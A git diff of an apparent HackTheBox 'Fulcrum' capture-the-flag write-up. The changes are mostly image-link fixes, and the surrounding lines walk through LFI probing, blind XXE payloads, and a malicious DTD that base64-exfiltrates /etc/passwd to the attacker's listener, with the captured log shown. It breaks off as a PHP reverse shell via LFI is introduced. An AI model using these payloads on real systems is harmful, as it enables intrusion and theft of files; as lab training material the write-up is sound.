@@ -1,5 +1,5 @@
 
-##### Host entries
+### Host entries
 ```bash
 10.10.10.62 upload.fulcrum.local
 ```
@@ -98,9 +98,9 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 There are a lot of web servers inside the machine so let's start in order:
 ##### http://10.10.10.62:4/
 Simple website under maintenance with a simple redirect on it:
-![[Pasted image 20230205170008.png]]
+![Description](/assets/img/Pasted image 20230205170008.png)
 by following such URL we get a parameter being called:
-![[Pasted image 20230205170046.png]]
+![Description](/assets/img/Pasted image 20230205170046.png)
 It seems like an interesting entry point so we try the following attacks:
 ```bash
 # Basic LFI
@@ -114,14 +114,14 @@ http://10.10.10.62:4/index.php?page=http://10.10.14.3
 # Additionally all of the previous scenarios were tested with NULL Byte in case that the ".php" extension is appended to every request
 ```
 Also we identified that the home.php is also reachable with an upload feature inside but it is not possible to upload any file (jpg or php):
-![[Pasted image 20230205183353.png]]
+![Description](/assets/img/Pasted image 20230205183353.png)
 ##### http://10.10.10.62/
 This server throws a .NET error message while accessing the "/index.htm" endpoint:
-![[Pasted image 20230205183842.png]]
+![Description](/assets/img/Pasted image 20230205183842.png)
 Other than that nothing interesting...
 ##### http://10.10.10.62:88/
 Port 88 has a phpMyAdmin login panel, interesting... but no default credentials in place so let's keep with the enumeration:
-![[Pasted image 20230205184025.png]]
+![Description](/assets/img/Pasted image 20230205184025.png)
 Now this service is interesting since it has a ton of endpoints available, after fuzzing this is the list that we get with dirsearch:
 ```bash
 dirsearch -u http://10.10.10.62:88/
@@ -179,14 +179,14 @@ Target: http://10.10.10.62:88/
 However none of them contains any useful information.
 ##### http://10.10.10.62:9999/
 No interesting endpoints on this port and the same error as in port 80:
-![[Pasted image 20230205185142.png]]
+![Description](/assets/img/Pasted image 20230205185142.png)
 ##### http://10.10.10.62:56423/
 Now for this port we get a response as shown in the image below, which indicates an API JSON response:
-![[Pasted image 20230205185330.png]]
+![Description](/assets/img/Pasted image 20230205185330.png)
 Let's deep dive into it by intercepting the traffic with Burpsuite:
-![[Pasted image 20230205185558.png]]
+![Description](/assets/img/Pasted image 20230205185558.png)
 Since this Content-Type allows application/json we can infer that a POST request should be allowed on the machine so let's change the HTTP Method and send it to observe the server's behavior after providing our IP as payload:
-![[Pasted image 20230205185833.png]]
+![Description](/assets/img/Pasted image 20230205185833.png)
 Notice that the Content-Type is non-restrictive since we didn't use the "application/json" so let's try a few payloads and different Contents, it is worth mentioning that we indeed receive an ICMP request after executing this payload:
 ```bash
 tcpdump -i tun0 -n
@@ -203,9 +203,9 @@ listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 ### Exploitation
 
 If we try with XML payload and we provide the parameter Ping this is what happens:
-![[Pasted image 20230205190544.png]]
+![Description](/assets/img/Pasted image 20230205190544.png)
 This tiny change on the server's response gives us a nice amount of time to think about a successful XXE, after searching over the Internet we find the following [Hactricks](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity) cheatsheet with an interesting "External Entity Injection" approach, after we tested it as follows:
-![[Pasted image 20230205195341.png]]
+![Description](/assets/img/Pasted image 20230205195341.png)
 We indeed received a request on our HTTP Listener:
 ```bash
 python3 -m http.server 80
@@ -220,7 +220,7 @@ You can often detect blind XXE triggering the out-of-band network interaction to
 <Ping>&xxe;</Ping>
 </Heartbleed>
 ```
-![[Pasted image 20230206005533.png]]
+![Description](/assets/img/Pasted image 20230206005533.png)
 In this case we receive a request on our web server:
 ```bash
 python3 -m http.server 80
@@ -239,11 +239,11 @@ This means that you can test for blind XXE using out-of-band detection via XML p
 ```c
 <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://10.10.14.3"> %xxe; ]>
 ```
-![[Pasted image 20230206005654.png]]
+![Description](/assets/img/Pasted image 20230206005654.png)
 Detecting a blind XXE vulnerability via out-of-band techniques is all very well, but it doesn't actually demonstrate how the vulnerability could be exploited. What an attacker really wants to achieve is to exfiltrate sensitive data. This can be achieved via a blind XXE vulnerability, but it involves the attacker hosting a malicious DTD on a system that they control, and then invoking the external DTD from within the in-band XXE payload.
 
 An example of a malicious DTD to exfiltrate the contents of the `/etc/passwd` file is as follows:
-![[Pasted image 20230206005910.png]]
+![Description](/assets/img/Pasted image 20230206005910.png)
 ```c
 <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
 <!ENTITY % param1 "<!ENTITY filename SYSTEM 'http://10.10.14.3/%file;'>">
@@ -271,7 +271,7 @@ Finally, the attacker must submit the following XXE payload to the vulnerable ap
 <Ping>&filename;</Ping>
 </Heartbleed>
 ```
-![[Pasted image 20230206013133.png]]
+![Description](/assets/img/Pasted image 20230206013133.png)
 And we'll receive the following request on our web server:
 ```python
 10.10.10.62 - - [06/Feb/2023 07:30:52] "GET /cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMDoxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMToxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC10aW1lc3luYzp4OjEwMjoxMDQ6c3lzdGVtZCBUaW1lIFN5bmNocm9uaXphdGlvbiwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDY6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDQ6MTEwOjovaG9tZS9zeXNsb2c6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnRzczp4OjEwNjoxMTE6VFBNIHNvZnR3YXJlIHN0YWNrLCwsOi92YXIvbGliL3RwbTovYmluL2ZhbHNlCnV1aWRkOng6MTA3OjExMjo6L3J1bi91dWlkZDovdXNyL3NiaW4vbm9sb2dpbgp0Y3BkdW1wOng6MTA4OjExMzo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCmxhbmRzY2FwZTp4OjEwOToxMTU6Oi92YXIvbGliL2xhbmRzY2FwZTovdXNyL3NiaW4vbm9sb2dpbgpwb2xsaW5hdGU6eDoxMTA6MTo6L3Zhci9jYWNoZS9wb2xsaW5hdGU6L2Jpbi9mYWxzZQpzc2hkOng6MTExOjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1jb3JlZHVtcDp4Ojk5OTo5OTk6c3lzdGVtZCBDb3JlIER1bXBlcjovOi91c3Ivc2Jpbi9ub2xvZ2luCmx4ZDp4Ojk5ODoxMDA6Oi92YXIvc25hcC9seGQvY29tbW9uL2x4ZDovYmluL2ZhbHNlCnVzYm11eDp4OjExMjo0Njp1c2JtdXggZGFlbW9uLCwsOi92YXIvbGliL3VzYm11eDovdXNyL3NiaW4vbm9sb2dpbgpkbnNtYXNxOng6MTEzOjY1NTM0OmRuc21hc3EsLCw6L3Zhci9saWIvbWlzYzovdXNyL3NiaW4vbm9sb2dpbgpsaWJ2aXJ0LXFlbXU6eDo2NDA1NToxMDg6TGlidmlydCBRZW11LCwsOi92YXIvbGliL2xpYnZpcnQ6L3Vzci9zYmluL25vbG9naW4KbGlidmlydC1kbnNtYXNxOng6MTE0OjEyMDpMaWJ2aXJ0IERuc21hc3EsLCw6L3Zhci9saWIvbGlidmlydC9kbnNtYXNxOi91c3Ivc2Jpbi9ub2xvZ2luCg== HTTP/1.0" 404 -
@@ -439,7 +439,7 @@ Since we already know that in port 80 there is a service with a potential SSRF v
 # Web server Request
 10.10.10.62-[06/Feb/2023 07:56:29] "GET /rev.php HTTP/1.0" 404
 ```
-![[Pasted image 20230206015759.png]]
+![Description](/assets/img/Pasted image 20230206015759.png)
 
 As we can see the request is appending a .php extension at the end of the endpoint called from this LFI payload, so we can conclude that it is expecting a PHP file, we can abuse of this and provide a reverse shell on this php to lead the server to provide a reverse shell: ^e70b79
 ```php
